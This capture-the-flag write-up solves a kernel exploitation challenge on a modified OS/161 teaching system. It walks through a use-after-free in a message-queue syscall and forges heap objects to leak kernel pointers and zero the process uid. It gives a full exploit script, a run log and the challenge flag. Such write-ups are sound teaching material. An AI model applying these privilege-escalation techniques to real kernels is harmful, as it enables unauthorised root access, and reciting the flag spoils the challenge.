# COMP3891: ASST5

## Authors

- Jarrod Cameron

## Category

- Binary Exploitation

## Description

The secret OS assignment no one has hear of... ASST5.

`http://pwn.unswsecurity.com:3891/`

The flag is in the format `SKYLIGHT{...}`

## Difficulty

- Child's Play

## Points

300

## Files

- files.zip: Contains source code, compiled binaries, pre-compiled tools,
  script to compile, and script to run executable

## Solution

<details>
<summary>Spoiler</summary>

### Idea


A use after free in the link list implementation allows us to corrupt the heap.
This can be leveraged to:
- Read arbitrary data
- Set any location in memory to 0.

Using these two primitive we can trace kernel object to overwrite the `uid` of
the current process. Finally, we use `readflag()` to read the flag into memory.

NOTE: The web UI allows OS161 to be run on the server side with the real flag.

### Walkthrough

#### 1. Understanding OS161

Looking at the `syscall()` function (`kern/arch/mips/syscall/syscall.c`) we can
see some system calls have been implmeneted:

- `write()`: Performs the well known write system call. Upon further inspection
  we see that it only supports `stdin` and `stdout`.
- `getuid()`: Get the user ID of the current process.
- `readflag()`: Reads the flag from disk and copys it to the user's address
  space. However, this system call only works if you are the root user.
- `sys_mq_open()`: Creates a message queue.
- `sys_mq_close()`: Closes a message queue.
- `sys_mq_send()`: Pushes a message onto the message queue.
- `sys_mq_recv()`: Receives a message off the message queue.
- `sys_mq_clear()`: Removes all messages from the message queue but does not
  free the message queue.

#### 2. Finding the vulnerability

After viewing the implementation of the message queue system calls
(`mq_syscalls.c`) we can see the bug is in `sys_mq_clear()`. The bug is that
each of the messages in the message queue are freed but the `front` and `back`
pointers still point to the freed memory. In other words, this is a "use after
free".

#### 3. Forging a fake message

The heap in OS161 works similar to the glibc heap. The take aways are:
- freed objects of similar size are stored in a queue
- When an object is allocated it is dequeued off the free list (according to
  its size)

Using the following code we can do some heap feng shui (aka heap grooming):

```c
#define BIG "AAAABBBBCCCCDDDD" \
        "AAAABBBBCCCCDDDD" \
        "AAAABBBBCCCCDDDD" \
        "AAAABBBBCCCCDDDD" \
        "AAAABBBBCCCCDDDD" \
        "AAAABBBBCCCCDDDD" \
        "AAAABBBBCCCCDDDD" \
        "AAAABBBBCCCCDDDD"

int mq1, mq2, mq3;

mq1 = mq_open();
mq2 = mq_open();
mq3 = mq_open();

mq_send(mq1, BIG, sizeof(BIG));
mq_send(mq2, BIG, sizeof(BIG));

mq_clear(mq1);
mq_clear(mq2);
```

After executing the above code `mq1` and `mq2` will have dangling `front`
pointers.

Calling `mq_send(mq3, ptr, 12)` will create a message of 12 bytes (the same
size as a `struct message`). If we can forge our own `message` what values
would we use?

Since our end goal is to overwrite `curproc->uid` to zero (required by
`readflag()`) we should try to find `curproc` in memory. Since the objects in
the heap are randomised (see `kheap_randomisation()` in `kern/vm/kmalloc.c`) we
can't assume `curproc` will be in the same location every time. Fortunatly we
can trace other objects in the heap!

#### 4. Traversing objects in the heap

`cputhreads[]` (in `kern/arch/mips/thread/cpu.c`) contains pointers for each of
the threads assigned to a specific CPU. By default OS161 only supports one
thread so the currently running thread should be stored in `&cputhreads[0]`.

Using the following code we can we the address of `cputhreads[0]`:

```sh
$ nm path/to/kernel | grep cputhreads
8003c150 B cputhreads
```

Using the following code we can create a forge a `message` object to reference
the `cputhreads[0]` value.

```
#define KERN_CPUTHREADS (0x8003c150)
#define PAGE_ADDR(n)    ((n) & 0xfffff000)
struct {
        void *next;
        size_t len;
        void *buf;
} __attribute__ ((aligned (4096))) fake;

printf("[-] Allocate \"fake\" message to overwrite MQ1's actual message\n");
fake.next = &fake,
fake.len = 4096,
fake.buf = (void *) PAGE_ADDR(KERN_CPUTHREADS);
mq_send(mq3, &fake, 12);
```

NOTE: `&fake` and `fake.buf` both need to be page aligned (one page is 4096
bytes). This is because of the `kfree()` implmenetation. `kfree()` will try to
free our object when called. If our object is not in the heap (e.g.
`cputhreads[0]`) then OS161 will assume that we are tring to free a page
(instead of a chunk). This will cause us to enter the `KASSERT()` function. If
our pointer is not page aligned then the `KASSERT()` function will fail and the
kernel will `panic()`.

NOTE: We set `fake.next` to `&fake` so we can continue to forge fake messages.

#### 5. Extracting curthread

Using the following code we can read in the page containing the pointer
referencing `curthread`:

```c
#define PAGE_OFFSET(n) ((n) & 0x00000fff)
unsigned char buf[4096] __attribute__ ((aligned (4096))) = {0};

unsigned int curthread_ptr
mq_recv(mq1, &buf, sizeof(buf));
curthread_ptr = *(unsigned int *) &buf[PAGE_OFFSET(KERN_CPUTHREADS)];
```

`curthread_ptr` pointer is now pointing to the currently running thread
object on the heap. By looking at `struct thread` (in `kern/include/thread.h`)
we can see that `t_proc` is at an offset of 0x54 bytes.

#### 6. Extracting curproc

Similar to the previous two steps, we use the `fake` struct to get the location
of `curproc`.

```
fake.next = &fake;
fake.len = 4096;
fake.buf = (void *) PAGE_ADDR(curthread_ptr + 0x54);
mq_recv(mq1, &buf, sizeof(buf));
curproc_ptr = *(unsigned int *) &buf[PAGE_OFFSET(curthread_ptr + 0x54)];
```

#### 7. Setting UID to zero

Looking at the `msg_dequeue()` (`kern/syscall/mq_syscalls.c`) we can see that
`message->next` is set to `NULL` when removed from the list. In other words,
`message_queue->front->next` to will set be set to `NULL`. If we control
`message_queue->front` we can write `NULL` to any location we like. If we can
set `curproc->uid` to `NULL` then we can call the `readflag()` syscall!

Looking at `struct proc` (in `kern/include/proc.h`) we can see that `uid` has
an offset of 0x18. Using the following code we can set `uid` to zero.

```c
fake.next = (void *) curproc_ptr + 0x18;
fake.len = 0;
fake.buf = NULL;
mq_recv(mq1, NULL, 0);
mq_recv(mq1, NULL, 0);
```

NOTE: We call `mq_recv(...)` the first time to store `curproc_ptr + 0x18` in
`message_queue->front`. Then we call `mq_recv(...)` again to set `uid` to zero.

#### 8. Read and print flag

Since we are root, we can now read the flag:

```c
char flag[260] = {0};
readflag(flag, sizeof(flag));
printf("[+] readflag() = \"%s\"\n", flag);
```

#### 9. Final Exploit

NOTE: You might need to change the last line based on required IP and port.

```
#!/bin/sh

# Exit on non-zero return status
set -e

pwnc="$(find -type f -name pwn.c)"

echo '
#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <err.h>
#include <string.h>
#include <errno.h>

#define BIG "AAAABBBBCCCCDDDD" \
	"AAAABBBBCCCCDDDD" \
	"AAAABBBBCCCCDDDD" \
	"AAAABBBBCCCCDDDD" \
	"AAAABBBBCCCCDDDD" \
	"AAAABBBBCCCCDDDD" \
	"AAAABBBBCCCCDDDD" \
	"AAAABBBBCCCCDDDD"

#define KERN_CPUTHREADS (0x8003c150)

#define PAGE_OFFSET(n) ((n) & 0x00000fff)
#define PAGE_ADDR(n)   ((n) & 0xfffff000)

/* Forward declaration */
int mq_open(void);
int mq_send(int, const void *, size_t);
int mq_clear(int);
int readflag(char *, size_t);
int mq_recv(int, void *, size_t);

/* Buffer used for storing results. Must be page aligned to prevent KASSERT() */
unsigned char buf[4096] __attribute__ ((aligned (4096))) = {0};

/* Our fake message, must be page aligned to prevent KASSERT() */
struct {
	void *next;
	size_t len;
	void *buf;
} __attribute__ ((aligned (4096))) fake;

int
main (void)
{
	unsigned int curthread_ptr, curproc_ptr;
	int mq1, mq2, mq3;
	char flag[260] = {0};
	printf("\n");

	printf("[-] Create message queue 1,2, and 3\n");
	mq1 = mq_open();
	mq2 = mq_open();
	mq3 = mq_open();

	printf("[-] Allocate a big message for message queues 1 and 2\n");
	mq_send(mq1, BIG, sizeof(BIG));
	mq_send(mq2, BIG, sizeof(BIG));

	printf("[-] Clear message queues 1 and 2\n");
	mq_clear(mq1);
	mq_clear(mq2);

	printf("[-] Allocate \"fake\" message to overwrite MQ1s actual message\n");
	fake.next = &fake,
	fake.len = 4096,
	fake.buf = (void *) PAGE_ADDR(KERN_CPUTHREADS);
	mq_send(mq3, &fake, 12);

	printf("[-] Leak the address of curthread\n");
	mq_recv(mq1, &buf, sizeof(buf));
	curthread_ptr = *(unsigned int *) &buf[PAGE_OFFSET(KERN_CPUTHREADS)];
	printf("[+] &curthread = 0x%x\n", curthread_ptr);

	printf("[-] Leak the address of curproc\n");
	fake.next = &fake;
	fake.len = 4096;
	fake.buf = (void *) PAGE_ADDR(curthread_ptr + 0x54);
	mq_recv(mq1, &buf, sizeof(buf));
	curproc_ptr = *(unsigned int *) &buf[PAGE_OFFSET(curthread_ptr + 0x54)];
	printf("[+] &curproc = 0x%x\n", curproc_ptr);

	printf("[-] Set message_queue->front = &curproc->uid\n");
	fake.next = (void *) curproc_ptr + 0x18;
	fake.len = 0;
	fake.buf = NULL;
	mq_recv(mq1, NULL, 0);

	printf("[+] Set curproc->uid to 0!\n");
	mq_recv(mq1, NULL, 0);

	readflag(flag, sizeof(flag));
	printf("[+] readflag() = \"%s\"\n", flag);

	return 0;
}
' > "$pwnc"

bash ./compile_pwn.sh os161/ tools/
pwnbin="$(find -name pwn -type f | head -n1)"

curl -F pwnbin=@"$pwnbin" http://172.17.0.2:3891/exploit
```

```
$ bash run.sh
...
sys161: System/161 release 2.0.3, compiled Jun 28 2022 04:51:46

OS/161 base system version 2.0.3
Copyright (c) 2000, 2001-2005, 2008-2011, 2013, 2014
   President and Fellows of Harvard College.  All rights reserved.

Skylight Cyber's system version 0 (SKYCTF #1337)

264k physical memory available
Device probe...
lamebus0 (system main bus)
emu0 at lamebus0
ltrace0 at lamebus0
ltimer0 at lamebus0
beep0 at ltimer0
rtclock0 at ltimer0
lrandom0 at lamebus0
random0 at lrandom0
lser0 at lamebus0
con0 at lser0

cpu0: MIPS/161 (System/161 2.x) features 0x0
OS/161 kernel: p /bin/3ee418f5e91beea97d63fe7ab92e222d.bin
Operation took 0.114112640 seconds
OS/161 kernel [? for menu]:
[-] Create message queue 1,2, and 3
[-] Allocate a big message for message queues 1 and 2
[-] Clear message queues 1 and 2
[-] Allocate "fake" message to overwrite MQ1s actual message
[-] Leak the address of curthread
[+] &curthread = 0x8003ed8c
[-] Leak the address of curproc
[+] &curproc = 0x8003ee0c
[-] Set message_queue->front = &curproc->uid
[+] Set curproc->uid to 0!
[+] readflag() = "SKYLIGHT{Lo0k1nG_f0rWArD_t0_$3E1ng_$om3_KeRnEl_0DAyz_cb70}"
...
```

### Flag

```
SKYLIGHT{Lo0k1nG_f0rWArD_t0_$3E1ng_$om3_KeRnEl_0DAyz_cb70}
```

</details>

